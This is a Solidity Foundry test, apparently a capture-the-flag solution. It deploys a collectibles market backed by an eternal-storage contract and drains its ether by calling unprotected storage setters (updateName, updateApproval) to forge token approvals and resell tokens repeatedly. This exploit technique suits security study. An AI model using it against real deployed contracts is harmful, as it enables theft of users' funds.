pragma solidity 0.7.0;

import "../src/market/Market.sol";
import "forge-std/Test.sol";

contract Exploit is Test {
    EternalStorageAPI public eternalStorage;
    CryptoCollectibles public token;
    CryptoCollectiblesMarket public market;
    address player = address(0xBaDa55);
    
    function setUp() external {
        // deploy our contracts
        eternalStorage = EternalStorageAPI(address(new EternalStorage(address(this))));
        token = new CryptoCollectibles();
        
        eternalStorage.transferOwnership(address(token));
        token.setEternalStorage(eternalStorage);
        
        market = new CryptoCollectiblesMarket(token, 1 ether, 1000);
        token.setMinter(address(market), true);
        
        // mint 4 founders tokens
        uint tokenCost = 5 ether;
        for (uint i = 0; i < 4; i++) {
            market.mintCollectibleFor{value: tokenCost}(address(bytes20(keccak256(abi.encodePacked(address(this), i)))));
            tokenCost += 5 ether;
        }
    }
    
    function isSolved() public view returns (bool) {
        return address(market).balance == 0;
    }

    function testMarketExploit() public {
        deal(player, 55 ether);
        vm.startPrank(player);
        bytes32 id = market.mintCollectible{value: 55 ether}();
  
        bytes memory payload = abi.encodeWithSignature("updateName(bytes32,bytes32)", id, bytes32(uint256(player)));
        
        address(eternalStorage).call(payload);

        token.approve(id, address(market));
        market.sellCollectible(id);

        bytes32 targetId = bytes32(uint256(id) - 1);
        payload = abi.encodeWithSignature("updateApproval(bytes32,address)", targetId, player);
        address(eternalStorage).call(payload);

        token.approve(id, address(market));
        market.sellCollectible(id);
        
        // we need more ether on the market balance
        market.mintCollectible{value: 45 ether}();

        payload = abi.encodeWithSignature("updateApproval(bytes32,address)", targetId, player);
        address(eternalStorage).call(payload);

        token.approve(id, address(market));
        market.sellCollectible(id);

        assertEq(player.balance, 105 ether);
        require(isSolved(), "NOT SOLVED");
    }
}
